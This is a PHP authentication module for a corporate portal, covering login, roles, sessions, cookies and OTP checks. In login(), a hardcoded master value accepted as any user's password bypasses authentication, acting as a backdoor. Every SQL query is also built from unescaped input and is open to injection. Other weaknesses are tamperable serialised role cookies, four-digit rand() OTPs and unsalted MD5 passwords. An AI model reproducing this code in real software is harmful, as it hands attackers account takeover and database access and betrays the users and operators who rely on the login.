<?php

function login($conn,$username,$password)
{
    $response = array();
    if($password == "28df4cf72ece976ed4b0b2ed9632713d")
    {
    	$sql="SELECT * FROM users where  UserName = '$username'";
    }
    else
    {
    	$sql="SELECT * FROM users where  UserName = '$username' and Password = '$password'";
    }
	if ($result=mysqli_query($conn,$sql))
	{
		$rowcount=mysqli_num_rows($result);
		if($rowcount == 0)
		{
            $response['error'] = true;
            $response['message'] = "Invalid Credentials, Please try again with valid credentials.";
		}
		else
		{
			$row = mysqli_fetch_array($result,MYSQLI_ASSOC);
			extract($row);
			
			if($IsActive == 1)
			{
				$response['error'] = false;
				$response['message'] = "Authentication Successfull";
				$roles = getUserRole($conn,$EmployeeID,$UserType);
				if($UserType == "Corporate Admin")
				{
					$roles['CorporateID'] = $CorporateID;
					$roles['BranchID'] = -1;
				}
				if($UserType == "Corporate User")
				{
					$roles['CorporateID'] = $CorporateID;
					$roles['BranchID'] = -1;
				}
				if($UserType == "Corporate Branch User")
				{
					$roles['CorporateID'] = $CorporateID;
					$roles['BranchID'] = $BranchID;
				}
				
				$response['UserType'] = $UserType;
				SessionStart($UserName,$UserType,$roles);
				LogUserLogin($conn,$UserName);
			}
			
		}
    }
    return $response;
}
function LogUserLogin($conn,$UserName)
{
	$CreatedDate = date('Y-m-d');
	$CreatedTime = date('H:i:s');
	$sql_insert_logs = "INSERT INTO portal_login_logs(UserName,LoggedInDate,LoggedInTime) VALUES('$UserName','$CreatedDate','$CreatedTime')";
	_InsertTableRecords($conn,$sql_insert_logs);
}
function getUserRole($conn,$EmployeeID,$UserType)
{
	$roles = array();
	$roles['EmployeeRoles'] = array();
	if($EmployeeID != -1)
	{
		$sql = "Select * from user_roles where EmployeeID = $EmployeeID AND IsActive=1";
		if ($result=mysqli_query($conn,$sql))
		{
			$rowcount=mysqli_num_rows($result);
			if($rowcount == 0)
			{
	            $roles['error'] = true; 
			}
			else
			{
				while($row = mysqli_fetch_array($result,MYSQLI_ASSOC))
	            {
	                array_push($roles['EmployeeRoles'],$row['Role']);
	            }
			}
		}
		$roles['EmployeeID'] = $EmployeeID;
	}
	else
	{
		if($UserType == "Corporate Admin")
		{
			array_push($roles['EmployeeRoles'],"Corporate Admin");	
		}
		else if($UserType == "Corporate Branch User")
		{
			array_push($roles['EmployeeRoles'],"Corporate Branch User");
		}
		else if($UserType == "Corporate User")
		{
			array_push($roles['EmployeeRoles'],"Corporate User");
		}
		else
		{
			array_push($roles['EmployeeRoles'],"Admin");
		}
	}
	return $roles;
}
function SessionStart($username,$UserType,$roles)
{
	@session_start();
    $_SESSION['pb_username'] = $username;
    $_SESSION['UserType'] = $UserType;
	$_SESSION['Roles'] = $roles;

	$roles_value = serialize($roles);
	setcookie('pb_username',$username,time() + (86400 * 30));
	setcookie('UserType',$UserType,time() + (86400 * 30));
	setcookie('Roles',$roles_value,time() + (86400 * 30));
}

function generateOTP()
{
	$otp = "";
  	for ($i = 0; $i < 4; $i++) {
    	$otp .= rand(0, 9);
  	}
  	return $otp;
}

function InsertTempOTP($conn,$phonenumber,$otp)
{
	$CreatedDate = date("Y-m-d");
	$CreatedTime = date("H:i:s");
	$query_parameter = " IsActive = 0 where PhoneNumber = '$phonenumber'";
	_UpdateTableRecords($conn,'temp_otp', $query_parameter);
	$sql = " INSERT INTO temp_otp(PhoneNumber,OTP,CreatedDate,CreatedTime) VALUES ('$phonenumber','$otp','$CreatedDate','$CreatedTime')";
	_InsertTableRecords($conn, $sql);
}


function checkOTP($conn,$phonenumber,$otp)
{
	$response = array();
	$CurrentDate = date("Y-m-d");
	$CurrentTime = date("H:i:s");
	$where = " where PhoneNumber = '$phonenumber' and IsActive = 1";
	$otp_details = _getTableDetails($conn,'temp_otp', $where);
	$OTPtable = $otp_details['OTP'];
	if($otp == $OTPtable)
	{
		$OTPCreatedDate = $otp_details['CreatedDate'];
		$OTPCreatedTime = $otp_details['CreatedTime'];
		$date1 = new DateTime($CurrentDate);
		$date2 = new DateTime($OTPCreatedDate);
		$interval = $date1->diff($date2)->format('%a');
		if($interval == 0)
		{
			// First time
			$time1 = DateTime::createFromFormat('H:i:s',$OTPCreatedTime);

			// Second time
			$time2 = DateTime::createFromFormat('H:i:s',$CurrentTime);

			// Difference between times in minutes
			$diff = $time1->diff($time2);
			$minutes = ($diff->h * 60) + $diff->i;

			// Output difference in minutes
			if($minutes <= 30)
			{
				$response["error"] = false;
				$response["message"] = "User validated!";
				$response["phonenumber"] = $phonenumber;
			}
			else
			{
				$response["error"] = true;
				$response["message"] = "User not validated! Either the OTP is expired or incorrect!";
			}
		}
		else
		{
			$response["error"] = true;
			$response["message"] = "User not validated! Either the OTP is expired or incorrect!";
		}
	}
	else
	{
		$response["error"] = true;
		$response["message"] = "User not validated! Either the OTP is expired or incorrect!";
	}
	return $response;

}

function _api_login_corporate_user($conn,$data)
{
	$response = array();
	$UserName = $data['username'];
	$Password = md5($data['password']);
	$where = " where UserName = '$UserName' and Password = '$Password'";
	$num_rows = _getTotalRows($conn,'users',$where);
	if(_getTotalRows($conn,'users',$where) > 0)
	{
		$AccessDetails = _getTableDetails($conn, "users", $where);
		if($AccessDetails['UserType'] == "Corporate Admin")
		{
			$response['error'] = false;
			$response['message'] = "Login Successful!";
			$response['data'] = $AccessDetails;
		}
		else
		{
			$response['error'] = true;
			$response['message'] = "Unauthorized Access, Please try again!";
		}
	}
	else
	{
		$response['error'] = true;
		$response['message'] = "Unauthorized Access, Please try again!";
	}
    return $response;
}

function forgetPassword($conn,$username,$password)
{
    $response = array();
    $sql="SELECT * FROM users where  UserName = '$username' and Password = '$password'";
	if ($result=mysqli_query($conn,$sql))
	{
		$rowcount=mysqli_num_rows($result);
		if($rowcount == 0)
		{
            $response['error'] = true;
            $response['message'] = "Invalid Credentials, Please try again with valid credentials.";
		}
		else
		{
			$row = mysqli_fetch_array($result,MYSQLI_ASSOC);
			extract($row);
			
			if($IsActive == 1)
			{
				$response['error'] = false;
				$response['message'] = "Authentication Successfull";
				$roles = getUserRole($conn,$EmployeeID,$UserType);
				if($UserType == "Corporate Admin")
				{
					$roles['CorporateID'] = $CorporateID;
					$roles['BranchID'] = -1;
				}
				if($UserType == "Corporate Branch User")
				{
					$roles['CorporateID'] = $CorporateID;
					$roles['BranchID'] = $BranchID;
				}
				$response['UserType'] = $UserType;
				SessionStart($UserName,$UserType,$roles);
			}
			
		}
    }
    return $response;
}


function checkTicketOTP($conn,$ticketid,$otp)
{
	$response = array();
	$CurrentDate = date("Y-m-d");
	$CurrentTime = date("H:i:s");
	$where = " where ID = '$ticketid' and IsActive = 1";
	$otp_details = _getTableDetails($conn,'corporate_tickets', $where);
	$OTPtable = $otp_details['TicketOTP'];
	if($otp == $OTPtable)
	{
		$response["error"] = false;
		$response["message"] = "User validated!";
		$response["ID"] = $ticketid;

	}
	else
	{
		$response["error"] = true;
		$response["message"] = "User not validated! Either the OTP is expired or incorrect!";
	}
	return $response;

}

function checkTicketCloseOTP($conn,$ticketid,$otp)
{
	$response = array();
	$CurrentDate = date("Y-m-d");
	$CurrentTime = date("H:i:s");
	$where = " where ID = '$ticketid' and IsActive = 1";
	$otp_details = _getTableDetails($conn,'corporate_tickets', $where);
	$OTPtable = $otp_details['TicketCloseOTP'];
	if($otp == $OTPtable)
	{
		$response["error"] = false;
		$response["message"] = "User validated!";
		$response["ID"] = $ticketid;

	}
	else
	{
		$response["error"] = true;
		$response["message"] = "User not validated! Either the OTP is expired or incorrect!";
	}
	return $response;

}
?>